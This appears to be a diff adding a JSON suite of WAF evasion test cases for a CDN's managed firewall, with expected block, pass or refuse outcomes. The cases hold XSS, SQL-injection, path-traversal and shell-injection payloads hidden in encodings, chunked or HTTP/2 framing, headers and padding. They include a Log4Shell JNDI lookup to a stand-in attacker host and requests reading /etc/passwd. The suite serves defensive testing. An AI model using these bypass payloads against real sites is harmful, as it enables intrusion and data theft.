@@ -1,0 +1,659 @@
+{
+ "version": "evasions-1",
+ "description": "CDNFoundry evasion cases for the managed WAF baseline. Synthetic payloads only.",
+ "cases": [
+  {
+   "id": "evasion:xss-query",
+   "class": "framing",
+   "note": "XSS payload in the query string",
+   "expect": {
+    "balanced": "block",
+    "strict": "block"
+   },
+   "path": "/?q=%3Cscript%3Ealert(1)%3C/script%3E",
+   "headers": {
+    "User-Agent": "CDNFoundry-WAF-Baseline/1.0"
+   }
+  },
+  {
+   "id": "evasion:xss-content-length",
+   "class": "framing",
+   "note": "XSS in a POST with Content-Length",
+   "expect": {
+    "balanced": "block",
+    "strict": "block"
+   },
+   "method": "POST",
+   "headers": {
+    "Content-Type": "application/x-www-form-urlencoded",
+    "User-Agent": "CDNFoundry-WAF-Baseline/1.0"
+   },
+   "body": "q=%3Cscript%3Ealert(1)%3C%2Fscript%3E&note=hello"
+  },
+  {
+   "id": "evasion:xss-chunked",
+   "class": "framing",
+   "note": "XSS in a chunked POST without Content-Length (one chunk)",
+   "expect": {
+    "balanced": "block",
+    "strict": "block"
+   },
+   "method": "POST",
+   "headers": {
+    "Content-Type": "application/x-www-form-urlencoded",
+    "User-Agent": "CDNFoundry-WAF-Baseline/1.0"
+   },
+   "body": "q=%3Cscript%3Ealert(1)%3C%2Fscript%3E&note=hello",
+   "transport": "chunked"
+  },
+  {
+   "id": "evasion:xss-chunked-small",
+   "class": "framing",
+   "note": "XSS split over many 3-byte chunks",
+   "method": "POST",
+   "headers": {
+    "Content-Type": "application/x-www-form-urlencoded",
+    "User-Agent": "CDNFoundry-WAF-Baseline/1.0"
+   },
+   "body": "q=%3Cscript%3Ealert(1)%3C%2Fscript%3E&note=hello",
+   "transport": "chunked",
+   "chunk_size": 3
+  },
+  {
+   "id": "evasion:xss-chunked-json",
+   "class": "framing",
+   "note": "XSS in a chunked JSON body",
+   "expect": {
+    "balanced": "block",
+    "strict": "block"
+   },
+   "method": "POST",
+   "headers": {
+    "Content-Type": "application/json",
+    "User-Agent": "CDNFoundry-WAF-Baseline/1.0"
+   },
+   "body": "{\"q\": \"<script>alert(1)</script>\"}",
+   "transport": "chunked"
+  },
+  {
+   "id": "evasion:xss-chunked-multipart",
+   "class": "framing",
+   "note": "XSS in a chunked multipart field",
+   "expect": {
+    "balanced": "block",
+    "strict": "block"
+   },
+   "method": "POST",
+   "headers": {
+    "Content-Type": "multipart/form-data; boundary=B",
+    "User-Agent": "CDNFoundry-WAF-Baseline/1.0"
+   },
+   "transport": "chunked",
+   "body": "--B\r\nContent-Disposition: form-data; name=\"q\"\r\n\r\n<script>alert(1)</script>\r\n--B--\r\n"
+  },
+  {
+   "id": "evasion:xss-h2",
+   "class": "framing",
+   "note": "XSS in an HTTP/2 POST over TLS without Content-Length",
+   "expect": {
+    "balanced": "block",
+    "strict": "block"
+   },
+   "method": "POST",
+   "headers": {
+    "Content-Type": "application/x-www-form-urlencoded",
+    "User-Agent": "CDNFoundry-WAF-Baseline/1.0"
+   },
+   "body": "q=%3Cscript%3Ealert(1)%3C%2Fscript%3E&note=hello",
+   "transport": "h2"
+  },
+  {
+   "id": "evasion:xss-h2c",
+   "class": "framing",
+   "note": "XSS in a cleartext HTTP/2 POST without Content-Length",
+   "expect": {
+    "balanced": "block",
+    "strict": "block"
+   },
+   "method": "POST",
+   "headers": {
+    "Content-Type": "application/x-www-form-urlencoded",
+    "User-Agent": "CDNFoundry-WAF-Baseline/1.0"
+   },
+   "body": "q=%3Cscript%3Ealert(1)%3C%2Fscript%3E&note=hello",
+   "transport": "h2c"
+  },
+  {
+   "id": "evasion:sqli-chunked",
+   "class": "framing",
+   "note": "SQL injection in a chunked POST",
+   "expect": {
+    "balanced": "block",
+    "strict": "block"
+   },
+   "method": "POST",
+   "headers": {
+    "Content-Type": "application/x-www-form-urlencoded",
+    "User-Agent": "CDNFoundry-WAF-Baseline/1.0"
+   },
+   "body": "id=1%27%20UNION%20SELECT%20username%2Cpassword%20FROM%20users--%20-",
+   "transport": "chunked"
+  },
+  {
+   "id": "evasion:sqli-h2",
+   "class": "framing",
+   "note": "SQL injection in an HTTP/2 POST without Content-Length",
+   "expect": {
+    "balanced": "block",
+    "strict": "block"
+   },
+   "method": "POST",
+   "headers": {
+    "Content-Type": "application/x-www-form-urlencoded",
+    "User-Agent": "CDNFoundry-WAF-Baseline/1.0"
+   },
+   "body": "id=1%27%20UNION%20SELECT%20username%2Cpassword%20FROM%20users--%20-",
+   "transport": "h2"
+  },
+  {
+   "id": "evasion:benign-chunked",
+   "class": "framing-clean",
+   "note": "A clean chunked POST must pass",
+   "expect": {
+    "balanced": "pass",
+    "strict": "pass"
+   },
+   "method": "POST",
+   "headers": {
+    "Content-Type": "application/x-www-form-urlencoded",
+    "User-Agent": "CDNFoundry-WAF-Baseline/1.0"
+   },
+   "body": "name=alice&city=Tehran&note=hello+world",
+   "transport": "chunked"
+  },
+  {
+   "id": "evasion:benign-h2",
+   "class": "framing-clean",
+   "note": "A clean HTTP/2 POST without Content-Length must pass",
+   "expect": {
+    "balanced": "pass",
+    "strict": "pass"
+   },
+   "method": "POST",
+   "headers": {
+    "Content-Type": "application/x-www-form-urlencoded",
+    "User-Agent": "CDNFoundry-WAF-Baseline/1.0"
+   },
+   "body": "name=alice&city=Tehran&note=hello+world",
+   "transport": "h2"
+  },
+  {
+   "id": "evasion:xss-double-url-encoded",
+   "class": "encoding",
+   "note": "Double URL-encoded script tag in the query",
+   "path": "/?q=%253Cscript%253Ealert(1)%253C/script%253E",
+   "headers": {
+    "User-Agent": "CDNFoundry-WAF-Baseline/1.0"
+   }
+  },
+  {
+   "id": "evasion:xss-percent-u",
+   "class": "encoding",
+   "note": "IIS-style %u encoding of a script tag",
+   "path": "/?q=%u003Cscript%u003Ealert(1)%u003C/script%u003E",
+   "headers": {
+    "User-Agent": "CDNFoundry-WAF-Baseline/1.0"
+   }
+  },
+  {
+   "id": "evasion:xss-mixed-case",
+   "class": "encoding",
+   "note": "Mixed-case script tag",
+   "expect": {
+    "balanced": "block",
+    "strict": "block"
+   },
+   "path": "/?q=%3CScRiPt%3Ealert(1)%3C/sCrIpT%3E",
+   "headers": {
+    "User-Agent": "CDNFoundry-WAF-Baseline/1.0"
+   }
+  },
+  {
+   "id": "evasion:xss-html-entities",
+   "class": "encoding",
+   "note": "HTML-entity encoded handler attribute",
+   "path": "/?q=%3Cimg%20src%3Dx%20onerror%3D%26%2397%3Blert(1)%3E",
+   "headers": {
+    "User-Agent": "CDNFoundry-WAF-Baseline/1.0"
+   }
+  },
+  {
+   "id": "evasion:xss-null-byte",
+   "class": "encoding",
+   "note": "Null byte inside the tag name",
+   "path": "/?q=%3Cscr%00ipt%3Ealert(1)%3C/script%3E",
+   "headers": {
+    "User-Agent": "CDNFoundry-WAF-Baseline/1.0"
+   }
+  },
+  {
+   "id": "evasion:xss-utf7",
+   "class": "encoding",
+   "note": "UTF-7 encoded script tag with a UTF-7 charset",
+   "method": "POST",
+   "headers": {
+    "Content-Type": "application/x-www-form-urlencoded; charset=utf-7",
+    "User-Agent": "CDNFoundry-WAF-Baseline/1.0"
+   },
+   "body": "q=%2BADw-script%2BAD4-alert(1)%2BADw-/script%2BAD4-"
+  },
+  {
+   "id": "evasion:xss-gzip-body",
+   "class": "encoding",
+   "note": "XSS in a gzip Content-Encoding body the WAF cannot read",
+   "method": "POST",
+   "headers": {
+    "Content-Type": "application/x-www-form-urlencoded",
+    "Content-Encoding": "gzip",
+    "User-Agent": "CDNFoundry-WAF-Baseline/1.0"
+   },
+   "body_base64": "H4sIAAAAAAACAyu0VTV2Lk4uyiwoUTV2TcxJLSrRMNQEiqkaucGF1fLyS1JtM1JzcvIBgBV7FzAAAAA="
+  },
+  {
+   "id": "evasion:sqli-comment-split",
+   "class": "encoding",
+   "note": "UNION SELECT split by inline comments",
+   "path": "/?id=1%27%20UN/**/ION%20SEL/**/ECT%20password%20FROM%20users--%20-",
+   "headers": {
+    "User-Agent": "CDNFoundry-WAF-Baseline/1.0"
+   }
+  },
+  {
+   "id": "evasion:sqli-newline-space",
+   "class": "encoding",
+   "note": "UNION SELECT separated by newlines",
+   "path": "/?id=1%27%0aUNION%0aSELECT%0apassword%0aFROM%0ausers--%20-",
+   "headers": {
+    "User-Agent": "CDNFoundry-WAF-Baseline/1.0"
+   }
+  },
+  {
+   "id": "evasion:sqli-fullwidth",
+   "class": "encoding",
+   "note": "Full-width Unicode quote and keywords",
+   "path": "/?id=1%EF%BC%87%20OR%20%EF%BC%871%EF%BC%87%3D%EF%BC%871",
+   "headers": {
+    "User-Agent": "CDNFoundry-WAF-Baseline/1.0"
+   }
+  },
+  {
+   "id": "evasion:sqli-classic",
+   "class": "control",
+   "note": "Classic tautology in the query",
+   "expect": {
+    "balanced": "block",
+    "strict": "block"
+   },
+   "path": "/?id=1%27%20OR%20%271%27%3D%271",
+   "headers": {
+    "User-Agent": "CDNFoundry-WAF-Baseline/1.0"
+   }
+  },
+  {
+   "id": "evasion:sqli-union-query",
+   "class": "control",
+   "note": "UNION SELECT in the query",
+   "expect": {
+    "balanced": "block",
+    "strict": "block"
+   },
+   "path": "/?id=1%20UNION%20SELECT%20username,password%20FROM%20users",
+   "headers": {
+    "User-Agent": "CDNFoundry-WAF-Baseline/1.0"
+   }
+  },
+  {
+   "id": "evasion:sqli-json-body",
+   "class": "control",
+   "note": "SQL injection in a JSON field",
+   "expect": {
+    "balanced": "block",
+    "strict": "block"
+   },
+   "method": "POST",
+   "headers": {
+    "Content-Type": "application/json",
+    "User-Agent": "CDNFoundry-WAF-Baseline/1.0"
+   },
+   "body": "{\"id\": \"1' OR '1'='1' -- \"}"
+  },
+  {
+   "id": "evasion:traversal-plain",
+   "class": "control",
+   "note": "Path traversal to /etc/passwd",
+   "expect": {
+    "balanced": "block",
+    "strict": "block"
+   },
+   "path": "/?file=../../../../etc/passwd",
+   "headers": {
+    "User-Agent": "CDNFoundry-WAF-Baseline/1.0"
+   }
+  },
+  {
+   "id": "evasion:traversal-encoded-slash",
+   "class": "encoding",
+   "note": "Path traversal with an encoded slash",
+   "path": "/?file=..%2f..%2f..%2f..%2fetc%2fpasswd",
+   "headers": {
+    "User-Agent": "CDNFoundry-WAF-Baseline/1.0"
+   }
+  },
+  {
+   "id": "evasion:traversal-double-encoded",
+   "class": "encoding",
+   "note": "Path traversal with a double-encoded dot",
+   "path": "/?file=%252e%252e/%252e%252e/etc/passwd",
+   "headers": {
+    "User-Agent": "CDNFoundry-WAF-Baseline/1.0"
+   }
+  },
+  {
+   "id": "evasion:rce-semicolon",
+   "class": "control",
+   "note": "Shell command after a semicolon",
+   "expect": {
+    "balanced": "block",
+    "strict": "block"
+   },
+   "path": "/?host=127.0.0.1%3Bcat%20/etc/passwd",
+   "headers": {
+    "User-Agent": "CDNFoundry-WAF-Baseline/1.0"
+   }
+  },
+  {
+   "id": "evasion:rce-subshell",
+   "class": "control",
+   "note": "Command substitution",
+   "path": "/?host=%24(id)",
+   "headers": {
+    "User-Agent": "CDNFoundry-WAF-Baseline/1.0"
+   }
+  },
+  {
+   "id": "evasion:log4shell",
+   "class": "control",
+   "note": "JNDI lookup in a header",
+   "expect": {
+    "balanced": "block",
+    "strict": "block"
+   },
+   "headers": {
+    "X-Api-Version": "${jndi:ldap://attacker.invalid/a}",
+    "User-Agent": "CDNFoundry-WAF-Baseline/1.0"
+   }
+  },
+  {
+   "id": "evasion:xss-user-agent",
+   "class": "location",
+   "note": "XSS in the User-Agent header",
+   "headers": {
+    "User-Agent": "<script>alert(1)</script>"
+   }
+  },
+  {
+   "id": "evasion:xss-referer",
+   "class": "location",
+   "note": "XSS in the Referer header",
+   "headers": {
+    "Referer": "http://x.example/?q=<script>alert(1)</script>",
+    "User-Agent": "CDNFoundry-WAF-Baseline/1.0"
+   }
+  },
+  {
+   "id": "evasion:xss-cookie",
+   "class": "location",
+   "note": "XSS in a cookie value",
+   "headers": {
+    "Cookie": "session=abc; theme=<script>alert(1)</script>",
+    "User-Agent": "CDNFoundry-WAF-Baseline/1.0"
+   }
+  },
+  {
+   "id": "evasion:xss-json-key",
+   "class": "location",
+   "note": "XSS in a JSON object key",
+   "method": "POST",
+   "headers": {
+    "Content-Type": "application/json",
+    "User-Agent": "CDNFoundry-WAF-Baseline/1.0"
+   },
+   "body": "{\"<script>alert(1)</script>\": \"x\"}"
+  },
+  {
+   "id": "evasion:xss-json-nested",
+   "class": "location",
+   "note": "XSS in a deeply nested JSON value",
+   "method": "POST",
+   "headers": {
+    "Content-Type": "application/json",
+    "User-Agent": "CDNFoundry-WAF-Baseline/1.0"
+   },
+   "body": "{\"a\": {\"b\": {\"c\": {\"d\": [\"<script>alert(1)</script>\"]}}}}"
+  },
+  {
+   "id": "evasion:xss-wrong-content-type",
+   "class": "location",
+   "note": "Form payload sent as text/plain",
+   "method": "POST",
+   "headers": {
+    "Content-Type": "text/plain",
+    "User-Agent": "CDNFoundry-WAF-Baseline/1.0"
+   },
+   "body": "q=%3Cscript%3Ealert(1)%3C%2Fscript%3E&note=hello"
+  },
+  {
+   "id": "evasion:xss-no-content-type",
+   "class": "location",
+   "note": "Form payload with no Content-Type",
+   "method": "POST",
+   "headers": {
+    "User-Agent": "CDNFoundry-WAF-Baseline/1.0"
+   },
+   "body": "q=%3Cscript%3Ealert(1)%3C%2Fscript%3E&note=hello"
+  },
+  {
+   "id": "evasion:xss-json-as-form",
+   "class": "location",
+   "note": "JSON payload sent as a form",
+   "method": "POST",
+   "headers": {
+    "Content-Type": "application/x-www-form-urlencoded",
+    "User-Agent": "CDNFoundry-WAF-Baseline/1.0"
+   },
+   "body": "{\"q\": \"<script>alert(1)</script>\"}"
+  },
+  {
+   "id": "evasion:xss-method-override",
+   "class": "location",
+   "note": "XSS in a PUT body with a method-override header",
+   "method": "POST",
+   "headers": {
+    "X-HTTP-Method-Override": "PUT",
+    "Content-Type": "application/x-www-form-urlencoded",
+    "User-Agent": "CDNFoundry-WAF-Baseline/1.0"
+   },
+   "body": "q=%3Cscript%3Ealert(1)%3C%2Fscript%3E&note=hello"
+  },
+  {
+   "id": "evasion:xss-multipart-filename",
+   "class": "location",
+   "note": "Script tag in a multipart filename",
+   "method": "POST",
+   "headers": {
+    "Content-Type": "multipart/form-data; boundary=B",
+    "User-Agent": "CDNFoundry-WAF-Baseline/1.0"
+   },
+   "body": "--B\r\nContent-Disposition: form-data; name=\"f\"; filename=\"<script>alert(1)</script>.txt\"\r\nContent-Type: text/plain\r\n\r\nx\r\n--B--\r\n"
+  },
+  {
+   "id": "evasion:multipart-traversal-filename",
+   "class": "location",
+   "note": "Path traversal in a multipart filename",
+   "method": "POST",
+   "headers": {
+    "Content-Type": "multipart/form-data; boundary=B",
+    "User-Agent": "CDNFoundry-WAF-Baseline/1.0"
+   },
+   "body": "--B\r\nContent-Disposition: form-data; name=\"f\"; filename=\"../../../../etc/cron.d/x\"\r\nContent-Type: text/plain\r\n\r\nx\r\n--B--\r\n"
+  },
+  {
+   "id": "evasion:body-over-inspection-limit",
+   "class": "limits",
+   "note": "A body of 1 MiB + 1 byte is above the Recommended inspection limit",
+   "expect": {
+    "balanced": "refuse"
+   },
+   "method": "POST",
+   "headers": {
+    "Content-Type": "application/x-www-form-urlencoded",
+    "User-Agent": "CDNFoundry-WAF-Baseline/1.0"
+   },
+   "body_repeat": {
+    "unit": "a",
+    "count": 1048577
+   }
+  },
+  {
+   "id": "evasion:body-under-inspection-limit",
+   "class": "limits",
+   "note": "A clean body of 512 KiB is inspected and forwarded",
+   "expect": {
+    "balanced": "pass"
+   },
+   "method": "POST",
+   "headers": {
+    "Content-Type": "application/x-www-form-urlencoded",
+    "User-Agent": "CDNFoundry-WAF-Baseline/1.0"
+   },
+   "body_repeat": {
+    "unit": "a",
+    "count": 524288
+   }
+  },
+  {
+   "id": "evasion:body-over-high-limit",
+   "class": "limits",
+   "note": "A body of 256 KiB + 1 byte is above the High inspection limit",
+   "expect": {
+    "strict": "refuse"
+   },
+   "method": "POST",
+   "headers": {
+    "Content-Type": "application/x-www-form-urlencoded",
+    "User-Agent": "CDNFoundry-WAF-Baseline/1.0"
+   },
+   "body_repeat": {
+    "unit": "a",
+    "count": 262145
+   }
+  },
+  {
+   "id": "evasion:xss-after-limit-padding",
+   "class": "limits",
+   "note": "XSS placed after 300 KiB of padding, beyond the High limit but inside the Recommended limit",
+   "expect": {
+    "balanced": "block",
+    "strict": "refuse"
+   },
+   "method": "POST",
+   "headers": {
+    "Content-Type": "application/x-www-form-urlencoded",
+    "User-Agent": "CDNFoundry-WAF-Baseline/1.0"
+   },
+   "body_repeat": {
+    "unit": "pad=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&",
+    "count": 9500
+   },
+   "body_suffix": "q=%3Cscript%3Ealert(1)%3C%2Fscript%3E&note=hello"
+  },
+  {
+   "id": "evasion:header-too-large",
+   "class": "limits",
+   "note": "One header of 40 KiB is above the 32 KiB header limit",
+   "expect": {
+    "balanced": "refuse"
+   },
+   "headers": {
+    "User-Agent": "CDNFoundry-WAF-Baseline/1.0"
+   },
+   "header_value_repeat": {
+    "name": "X-Large",
+    "unit": "a",
+    "count": 40960
+   }
+  },
+  {
+   "id": "evasion:many-headers",
+   "class": "limits",
+   "note": "300 headers of 100 bytes",
+   "expect": {
+    "balanced": "refuse"
+   },
+   "headers": {
+    "User-Agent": "CDNFoundry-WAF-Baseline/1.0"
+   },
+   "header_repeat": {
+    "name": "X-H",
+    "unit": "a",
+    "size": 100,
+    "count": 300
+   }
+  },
+  {
+   "id": "evasion:long-uri",
+   "class": "limits",
+   "note": "A 9 KiB request target",
+   "headers": {
+    "User-Agent": "CDNFoundry-WAF-Baseline/1.0"
+   },
+   "path_repeat": {
+    "prefix": "/?q=",
+    "unit": "a",
+    "count": 9216
+   }
+  },
+  {
+   "id": "evasion:very-long-uri",
+   "class": "limits",
+   "note": "A 70 KiB request target",
+   "expect": {
+    "balanced": "refuse"
+   },
+   "headers": {
+    "User-Agent": "CDNFoundry-WAF-Baseline/1.0"
+   },
+   "path_repeat": {
+    "prefix": "/?q=",
+    "unit": "a",
+    "count": 71680
+   }
+  },
+  {
+   "id": "evasion:benign-long-query",
+   "class": "limits",
+   "note": "A clean 2 KiB query string must pass",
+   "expect": {
+    "balanced": "pass"
+   },
+   "headers": {
+    "User-Agent": "CDNFoundry-WAF-Baseline/1.0"
+   },
+   "path_repeat": {
+    "prefix": "/?q=",
+    "unit": "hello+",
+    "count": 340
+   }
+  }
+ ]
+}
